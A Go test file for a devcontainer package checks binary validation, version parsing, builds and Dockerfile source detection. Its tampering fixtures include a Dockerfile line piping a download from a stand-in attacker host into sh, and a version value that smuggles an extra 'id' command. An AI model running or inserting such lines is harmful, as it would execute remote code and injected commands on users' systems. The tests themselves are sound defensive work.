package devcontainer

import (
	"context"
	"debug/elf"
	"encoding/binary"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"

	"github.com/bayoudhdev/lyna-claude-tmux/internal/fsx"
)

// elfHeader builds the smallest ELF file debug/elf parses: a header with no
// sections and no program headers, for the given identity.
func elfHeader(class elf.Class, data elf.Data, machine elf.Machine, typ elf.Type, osabi elf.OSABI) []byte {
	var order binary.ByteOrder = binary.LittleEndian
	if data == elf.ELFDATA2MSB {
		order = binary.BigEndian
	}
	size := 64
	if class == elf.ELFCLASS32 {
		size = 52
	}
	b := make([]byte, size)
	copy(b, elf.ELFMAG)
	b[elf.EI_CLASS] = byte(class)
	b[elf.EI_DATA] = byte(data)
	b[elf.EI_VERSION] = byte(elf.EV_CURRENT)
	b[elf.EI_OSABI] = byte(osabi)
	order.PutUint16(b[16:], uint16(typ))
	order.PutUint16(b[18:], uint16(machine))
	order.PutUint32(b[20:], uint32(elf.EV_CURRENT))
	if class == elf.ELFCLASS32 {
		order.PutUint16(b[40:], 52) // e_ehsize
		order.PutUint16(b[42:], 32) // e_phentsize
		order.PutUint16(b[46:], 40) // e_shentsize
		return b
	}
	order.PutUint16(b[52:], 64) // e_ehsize
	order.PutUint16(b[54:], 56) // e_phentsize
	order.PutUint16(b[58:], 64) // e_shentsize
	return b
}

// linuxBinary is a valid staged binary for goarch.
func linuxBinary(goarch string) []byte {
	t := elfTargets[goarch]
	return elfHeader(t.class, t.data, t.machine, elf.ET_EXEC, elf.ELFOSABI_NONE)
}

func TestValidateBinary(t *testing.T) {
	cases := []struct {
		name    string
		data    []byte
		goarch  string
		wantErr string
	}{
		{name: "amd64 executable", data: linuxBinary("amd64"), goarch: "amd64"},
		{name: "arm64 executable", data: linuxBinary("arm64"), goarch: "arm64"},
		{name: "386 executable", data: linuxBinary("386"), goarch: "386"},
		{name: "s390x big endian", data: linuxBinary("s390x"), goarch: "s390x"},
		{name: "position independent", data: elfHeader(elf.ELFCLASS64, elf.ELFDATA2LSB, elf.EM_AARCH64, elf.ET_DYN, elf.ELFOSABI_LINUX), goarch: "arm64"},
		{name: "wrong architecture", data: linuxBinary("amd64"), goarch: "arm64", wantErr: "built for EM_X86_64 (ELFCLASS64), the image needs linux/arm64"},
		{name: "wrong class", data: linuxBinary("arm"), goarch: "arm64", wantErr: "the image needs linux/arm64"},
		{name: "wrong byte order", data: elfHeader(elf.ELFCLASS64, elf.ELFDATA2LSB, elf.EM_S390, elf.ET_EXEC, elf.ELFOSABI_NONE), goarch: "s390x", wantErr: "the image needs linux/s390x"},
		{name: "shared object only", data: elfHeader(elf.ELFCLASS64, elf.ELFDATA2LSB, elf.EM_X86_64, elf.ET_REL, elf.ELFOSABI_NONE), goarch: "amd64", wantErr: "not an executable"},
		{name: "freebsd binary", data: elfHeader(elf.ELFCLASS64, elf.ELFDATA2LSB, elf.EM_X86_64, elf.ET_EXEC, elf.ELFOSABI_FREEBSD), goarch: "amd64", wantErr: "the image needs Linux"},
		{name: "mach-o header", data: []byte{0xcf, 0xfa, 0xed, 0xfe, 0, 0, 0, 0}, goarch: "arm64", wantErr: "not an ELF binary"},
		{name: "windows header", data: []byte("MZ\x90\x00"), goarch: "amd64", wantErr: "not an ELF binary"},
		{name: "empty", data: nil, goarch: "amd64", wantErr: "not an ELF binary"},
		{name: "truncated", data: linuxBinary("amd64")[:20], goarch: "amd64", wantErr: "not an ELF binary"},
		{name: "unknown architecture", data: linuxBinary("amd64"), goarch: "mips", wantErr: `no Linux image architecture for "mips"`},
		{name: "darwin is not an architecture", data: linuxBinary("arm64"), goarch: "darwin", wantErr: "no Linux image architecture"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateBinary(tc.data, tc.goarch)
			if tc.wantErr == "" && err != nil || tc.wantErr != "" && (err == nil || !strings.Contains(err.Error(), tc.wantErr)) {
				t.Fatalf("ValidateBinary() = %v, want %q", err, tc.wantErr)
			}
		})
	}
}

func TestIsRelease(t *testing.T) {
	cases := []struct {
		v    string
		want bool
	}{
		{"v1.2.3", true},
		{"v0.1.0-rc.1", true},
		{"v10.20.30-beta", true},
		{"dev", false},
		{"(devel)", false},
		{"", false},
		{"1.2.3", false},
		{"v1.2", false},
		{"v0.0.0-20260916120000-abcdef123456", false},
		{"v1.2.4-0.20260916120000-abcdef123456", false},
		{"v1.2.3 ", false},
	}
	for _, tc := range cases {
		t.Run(tc.v, func(t *testing.T) {
			if got := IsRelease(tc.v); got != tc.want {
				t.Fatalf("IsRelease(%q) = %v, want %v", tc.v, got, tc.want)
			}
		})
	}
}

func TestDigest(t *testing.T) {
	cases := []struct {
		name string
		data string
		want string
	}{
		{name: "empty", data: "", want: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
		{name: "abc", data: "abc", want: "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Digest([]byte(tc.data))
			if got != tc.want {
				t.Fatalf("Digest = %s, want %s", got, tc.want)
			}
			if err := (Source{BinarySHA256: got}).validate(); err != nil {
				t.Fatalf("a digest does not validate as a source: %v", err)
			}
		})
	}
}

func TestSourceValidate(t *testing.T) {
	cases := []struct {
		name    string
		src     Source
		wantErr error
	}{
		{name: "release", src: release},
		{name: "staged", src: staged},
		{name: "none", src: Source{}, wantErr: ErrNoSource},
		{name: "both", src: Source{Version: "v1.2.3", BinarySHA256: staged.BinarySHA256}, wantErr: ErrSourceConflict},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := tc.src.validate(); !errors.Is(err, tc.wantErr) {
				t.Fatalf("validate() = %v, want %v", err, tc.wantErr)
			}
		})
	}
}

func TestModuleRoot(t *testing.T) {
	cases := []struct {
		name string
		// files maps paths below the temporary root to go.mod contents.
		files map[string]string
		// from is the directory the search starts in, below the root.
		from string
		// want is the module root below the temporary root, "" for none.
		want   string
		wantOK bool
	}{
		{name: "the directory itself", files: map[string]string{"go.mod": "module " + ModulePath + "\n\ngo 1.26.0\n"}, from: ".", want: ".", wantOK: true},
		{name: "an ancestor", files: map[string]string{"go.mod": "module " + ModulePath + "\n"}, from: "internal/cli", want: ".", wantOK: true},
		{name: "quoted module path", files: map[string]string{"go.mod": `module "` + ModulePath + `"` + "\n"}, from: ".", want: ".", wantOK: true},
		{name: "the nearest go.mod wins", files: map[string]string{"go.mod": "module " + ModulePath + "\n", "tool/go.mod": "module example.com/tool\n"}, from: "tool/cmd", wantOK: false},
		{name: "another module", files: map[string]string{"go.mod": "module example.com/other\n"}, from: "pkg", wantOK: false},
		{name: "a prefix of the module path", files: map[string]string{"go.mod": "module " + ModulePath + "-fork\n"}, from: ".", wantOK: false},
		{name: "no go.mod", files: nil, from: "a/b", wantOK: false},
		{name: "module directive in a comment", files: map[string]string{"go.mod": "// module " + ModulePath + "\nmodule example.com/x\n"}, from: ".", wantOK: false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			for name, content := range tc.files {
				mustWrite(t, filepath.Join(root, filepath.FromSlash(name)), content)
			}
			from := filepath.Join(root, filepath.FromSlash(tc.from))
			mustMkdir(t, from)
			got, ok := ModuleRoot(from)
			if ok != tc.wantOK {
				t.Fatalf("ModuleRoot(%s) = %q, %v; want ok=%v", from, got, ok, tc.wantOK)
			}
			if ok && got != filepath.Join(root, filepath.FromSlash(tc.want)) {
				t.Fatalf("ModuleRoot(%s) = %q, want %q", from, got, filepath.Join(root, tc.want))
			}
		})
	}
	// A search from the package's own directory finds this checkout, which
	// is what init relies on when run from inside it.
	wd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	got, ok := ModuleRoot(wd)
	if !ok || got != filepath.Clean(filepath.Join(wd, "..", "..")) {
		t.Fatalf("ModuleRoot(%s) = %q, %v; want the checkout", wd, got, ok)
	}
}

func TestIdentityLdflags(t *testing.T) {
	cases := []struct {
		name string
		id   Identity
		want string
	}{
		{name: "empty", id: Identity{}, want: "-s -w"},
		{name: "release", id: Identity{Version: "v1.2.3", Commit: "abc123", Date: "2026-09-16T00:00:00Z"}, want: "-s -w -X " + ModulePath + "/internal/version.Version=v1.2.3 -X " + ModulePath + "/internal/version.Commit=abc123 -X " + ModulePath + "/internal/version.Date=2026-09-16T00:00:00Z"},
		{name: "dev build", id: Identity{Version: "dev"}, want: "-s -w -X " + ModulePath + "/internal/version.Version=dev"},
		// A value the go command would split or quote is left out rather than
		// passed on: the stamp is cosmetic, the build must not break on it.
		{name: "space in a value", id: Identity{Version: "v1 2", Commit: "abc"}, want: "-s -w -X " + ModulePath + "/internal/version.Commit=abc"},
		{name: "quote in a value", id: Identity{Date: `2026"`}, want: "-s -w"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := tc.id.ldflags(); got != tc.want {
				t.Fatalf("ldflags() = %q, want %q", got, tc.want)
			}
		})
	}
}

// goBin is the toolchain running these tests, or the test is skipped.
func goBin(t *testing.T) string {
	t.Helper()
	bin, err := exec.LookPath("go")
	if err != nil {
		t.Skip("go is not on PATH")
	}
	return bin
}

// fakeModule writes a minimal checkout of ModulePath whose cmd/lmux
// prints its stamped version, so that Build can be exercised in a second
// rather than by compiling the whole CLI.
func fakeModule(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	mustWrite(t, filepath.Join(root, "go.mod"), "module "+ModulePath+"\n")
	mustWrite(t, filepath.Join(root, "internal", "version", "version.go"), "package version\n\nvar Version = \"\"\n")
	mustWrite(t, filepath.Join(root, "cmd", "lmux", "main.go"),
		"package main\n\nimport (\n\t\"fmt\"\n\n\t\""+ModulePath+"/internal/version\"\n)\n\nfunc main() { fmt.Println(version.Version) }\n")
	return root
}

func TestBuild(t *testing.T) {
	bin := goBin(t)
	cases := []struct {
		name    string
		root    func(t *testing.T) string
		goarch  string
		wantErr string
	}{
		{name: "builds for the host architecture", root: fakeModule, goarch: runtime.GOARCH},
		{name: "cross-compiles", root: fakeModule, goarch: "amd64"},
		{name: "cross-compiles to arm64", root: fakeModule, goarch: "arm64"},
		{name: "unknown architecture", root: fakeModule, goarch: "mips", wantErr: "no Linux image architecture"},
		{name: "empty checkout", root: func(t *testing.T) string { return t.TempDir() }, goarch: runtime.GOARCH, wantErr: "go build in"},
		{name: "broken source", root: func(t *testing.T) string {
			root := fakeModule(t)
			mustWrite(t, filepath.Join(root, "cmd", "lmux", "main.go"), "package main\n\nfunc main() { undefined() }\n")
			return root
		}, goarch: runtime.GOARCH, wantErr: "undefined: undefined"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			data, err := Build(t.Context(), bin, tc.root(t), tc.goarch, Identity{Version: "v9.9.9"})
			if tc.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
					t.Fatalf("Build() = %d bytes, %v; want error containing %q", len(data), err, tc.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if err := ValidateBinary(data, tc.goarch); err != nil {
				t.Fatalf("built binary: %v", err)
			}
			if !strings.Contains(string(data), "v9.9.9") {
				t.Fatal("the identity was not stamped into the binary")
			}
		})
	}
}

func TestBuildLeavesNoTemporaryFiles(t *testing.T) {
	bin := goBin(t)
	tmp := t.TempDir()
	t.Setenv("TMPDIR", tmp)
	if _, err := Build(t.Context(), bin, fakeModule(t), runtime.GOARCH, Identity{}); err != nil {
		t.Fatal(err)
	}
	entries, err := os.ReadDir(tmp)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), "lyna-tmux-build-") {
			t.Fatalf("build directory %s left behind", e.Name())
		}
	}
}

// checkoutBuild caches the linux build of this checkout across the tests
// that need a real lyna-tmux binary.
var checkoutBuild = sync.OnceValues(func() ([]byte, error) {
	bin, err := exec.LookPath("go")
	if err != nil {
		return nil, err
	}
	root, ok := ModuleRoot(".")
	if !ok {
		return nil, errors.New("test does not run inside the checkout")
	}
	return Build(context.Background(), bin, root, runtime.GOARCH, Identity{Version: "e2e-test"})
})

// buildFromCheckout compiles cmd/lmux of this checkout for a Linux image
// of goarch, skipping when there is no toolchain or in short mode: it is the
// only test build that compiles the whole CLI.
func buildFromCheckout(t *testing.T, goarch string) []byte {
	t.Helper()
	if testing.Short() {
		t.Skip("building the checkout is skipped in short mode")
	}
	if goarch != runtime.GOARCH {
		t.Fatalf("checkout builds are cached for %s only", runtime.GOARCH)
	}
	data, err := checkoutBuild()
	if err != nil {
		if errors.Is(err, exec.ErrNotFound) {
			t.Skip("go is not on PATH")
		}
		t.Fatal(err)
	}
	return data
}

// TestBuildCheckout pins that the real module cross-compiles into a valid
// static Linux binary that carries the stamped identity: the default path
// of init when run from inside the checkout.
func TestBuildCheckout(t *testing.T) {
	data := buildFromCheckout(t, runtime.GOARCH)
	if err := ValidateBinary(data, runtime.GOARCH); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(data), "e2e-test") {
		t.Fatal("the identity was not stamped into the checkout build")
	}
}

// stagedProject writes a project whose Dockerfile copies a staged binary.
func stagedProject(t *testing.T, binary []byte) string {
	t.Helper()
	dir := t.TempDir()
	files, err := Render(Options{Project: "api", Source: Source{BinarySHA256: Digest(binary)}})
	if err != nil {
		t.Fatal(err)
	}
	files[FileBinary] = binary
	if _, err := Write(dir, files, false); err != nil {
		t.Fatal(err)
	}
	return dir
}

func TestDetectSource(t *testing.T) {
	binary := linuxBinary("amd64")
	cases := []struct {
		name    string
		project func(t *testing.T) string
		want    Source
		wantErr error
		errHas  string
	}{
		{
			name: "release", want: release,
			project: func(t *testing.T) string {
				dir := t.TempDir()
				files, err := Render(Options{Project: "api", Source: release})
				if err != nil {
					t.Fatal(err)
				}
				if _, err := Write(dir, files, false); err != nil {
					t.Fatal(err)
				}
				return dir
			},
		},
		{
			name: "pre-release", want: Source{Version: "v2.0.0-rc.1"},
			project: func(t *testing.T) string {
				dir := t.TempDir()
				files, err := Render(Options{Project: "api", Source: Source{Version: "v2.0.0-rc.1"}})
				if err != nil {
					t.Fatal(err)
				}
				if _, err := Write(dir, files, false); err != nil {
					t.Fatal(err)
				}
				return dir
			},
		},
		{
			name: "staged binary is hashed from disk", want: Source{BinarySHA256: Digest(binary)},
			project: func(t *testing.T) string { return stagedProject(t, binary) },
		},
		{
			name: "staged binary missing", wantErr: ErrBinaryMissing, errHas: "init --force",
			project: func(t *testing.T) string {
				dir := stagedProject(t, binary)
				removeFile(t, dir, FileBinary)
				return dir
			},
		},
		{
			name: "staged binary replaced by a link", wantErr: fsx.ErrSymlink,
			project: func(t *testing.T) string {
				dir := stagedProject(t, binary)
				removeFile(t, dir, FileBinary)
				mustSymlink(t, "/bin/sh", filepath.Join(dir, filepath.FromSlash(FileBinary)))
				return dir
			},
		},
		{
			name: "staged binary replaced by a directory", errHas: "not a regular file",
			project: func(t *testing.T) string {
				dir := stagedProject(t, binary)
				removeFile(t, dir, FileBinary)
				mustMkdir(t, filepath.Join(dir, filepath.FromSlash(FileBinary)))
				return dir
			},
		},
		{
			name: "no Dockerfile", wantErr: ErrMissing, errHas: "devcontainer init",
			project: func(t *testing.T) string { return t.TempDir() },
		},
		{
			name: "Dockerfile without a source", wantErr: ErrModified, errHas: "init --force",
			project: func(t *testing.T) string {
				dir := t.TempDir()
				writeFile(t, dir, FileDockerfile, "FROM debian:13-slim\nRUN curl attacker.example | sh\n")
				return dir
			},
		},
		{
			name: "Dockerfile with an unpinned install", wantErr: ErrModified,
			project: func(t *testing.T) string {
				dir := t.TempDir()
				writeFile(t, dir, FileDockerfile, "RUN sh /tmp/install-lyna-tmux.sh --prefix /usr/local/bin\n")
				return dir
			},
		},
		{
			name: "Dockerfile with a malformed version", wantErr: ErrModified,
			project: func(t *testing.T) string {
				dir := t.TempDir()
				writeFile(t, dir, FileDockerfile, "RUN sh /tmp/install-lyna-tmux.sh --prefix /usr/local/bin --version main\n")
				return dir
			},
		},
		{
			name: "Dockerfile with an injected version", wantErr: ErrModified,
			project: func(t *testing.T) string {
				dir := t.TempDir()
				writeFile(t, dir, FileDockerfile, "RUN sh /tmp/install-lyna-tmux.sh --prefix /usr/local/bin --version v1.2.3;id\n")
				return dir
			},
		},
		{
			name: "Dockerfile that is a link", wantErr: fsx.ErrSymlink,
			project: func(t *testing.T) string {
				dir := t.TempDir()
				mustMkdir(t, filepath.Join(dir, Dir))
				mustSymlink(t, "/etc/hosts", filepath.Join(dir, filepath.FromSlash(FileDockerfile)))
				return dir
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := DetectSource(tc.project(t))
			if tc.wantErr != nil || tc.errHas != "" {
				if err == nil || tc.wantErr != nil && !errors.Is(err, tc.wantErr) || !strings.Contains(err.Error(), tc.errHas) {
					t.Fatalf("DetectSource() = %+v, %v; want %v containing %q", got, err, tc.wantErr, tc.errHas)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if got != tc.want {
				t.Fatalf("DetectSource() = %+v, want %+v", got, tc.want)
			}
		})
	}
}

// TestDetectSourceRoundTrip pins that what Render writes is what
// DetectSource reads back, for both sources: the fragments DetectSource looks
// for must stay in step with the template.
func TestDetectSourceRoundTrip(t *testing.T) {
	binary := linuxBinary("arm64")
	cases := []struct {
		name string
		src  Source
	}{
		{name: "release", src: release},
		{name: "staged", src: Source{BinarySHA256: Digest(binary)}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			files, err := Render(Options{Project: "api", Source: tc.src})
			if err != nil {
				t.Fatal(err)
			}
			if tc.src.BinarySHA256 != "" {
				files[FileBinary] = binary
			}
			if _, err := Write(dir, files, false); err != nil {
				t.Fatal(err)
			}
			got, err := DetectSource(dir)
			if err != nil || got != tc.src {
				t.Fatalf("DetectSource() = %+v, %v; want %+v", got, err, tc.src)
			}
			if err := Verify(dir, files); err != nil {
				t.Fatal(err)
			}
		})
	}
}

func TestIgnoreBinary(t *testing.T) {
	cases := []struct {
		name string
		// existing is the .gitignore before the call; nil for none.
		existing    *string
		wantChanged bool
		want        string
		wantErr     error
	}{
		{name: "creates the file", wantChanged: true, want: ignoreHeader + "lmux\n"},
		{name: "appends to an existing file", existing: ptr("*.log\n"), wantChanged: true, want: "*.log\n" + ignoreHeader + "lmux\n"},
		{name: "terminates an unfinished last line first", existing: ptr("*.log"), wantChanged: true, want: "*.log\n" + ignoreHeader + "lmux\n"},
		{name: "empty file", existing: ptr(""), wantChanged: true, want: ignoreHeader + "lmux\n"},
		{name: "entry already present", existing: ptr("# mine\nlmux\n"), want: "# mine\nlmux\n"},
		{name: "anchored entry already present", existing: ptr("/lmux\n"), want: "/lmux\n"},
		{name: "entry with surrounding spaces", existing: ptr("  lmux  \n"), want: "  lmux  \n"},
		{name: "a different entry does not count", existing: ptr("lmux.bak\n"), wantChanged: true, want: "lmux.bak\n" + ignoreHeader + "lmux\n"},
		{name: "a commented entry does not count", existing: ptr("# lmux\n"), wantChanged: true, want: "# lmux\n" + ignoreHeader + "lmux\n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			target := filepath.Join(dir, filepath.FromSlash(FileGitignore))
			mustMkdir(t, filepath.Dir(target))
			if tc.existing != nil {
				mustWrite(t, target, *tc.existing)
			}
			path, changed, err := IgnoreBinary(dir)
			if !errors.Is(err, tc.wantErr) {
				t.Fatalf("IgnoreBinary() = %v, want %v", err, tc.wantErr)
			}
			if path != target || changed != tc.wantChanged {
				t.Fatalf("IgnoreBinary() = %q, %v; want %q, %v", path, changed, target, tc.wantChanged)
			}
			got, err := os.ReadFile(target)
			if err != nil || string(got) != tc.want {
				t.Fatalf(".gitignore = %q (%v), want %q", got, err, tc.want)
			}
		})
	}
}

func TestIgnoreBinaryRefusesLinks(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "victim"), "keep\n")
	mustMkdir(t, filepath.Join(dir, Dir))
	mustSymlink(t, filepath.Join(dir, "victim"), filepath.Join(dir, filepath.FromSlash(FileGitignore)))
	if _, changed, err := IgnoreBinary(dir); !errors.Is(err, fsx.ErrSymlink) || changed {
		t.Fatalf("IgnoreBinary() through a link = changed %v, %v; want %v", changed, err, fsx.ErrSymlink)
	}
	if got, err := os.ReadFile(filepath.Join(dir, "victim")); err != nil || string(got) != "keep\n" {
		t.Fatalf("the link target changed: %q, %v", got, err)
	}
}

func TestIgnoreBinaryKeepsMode(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, filepath.FromSlash(FileGitignore))
	mustWrite(t, target, "*.log\n")
	if err := os.Chmod(target, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, _, err := IgnoreBinary(dir); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(target)
	if err != nil || info.Mode().Perm() != 0o600 {
		t.Fatalf("mode %v, %v; want 0600 kept", info.Mode(), err)
	}
}

func ptr(s string) *string { return &s }
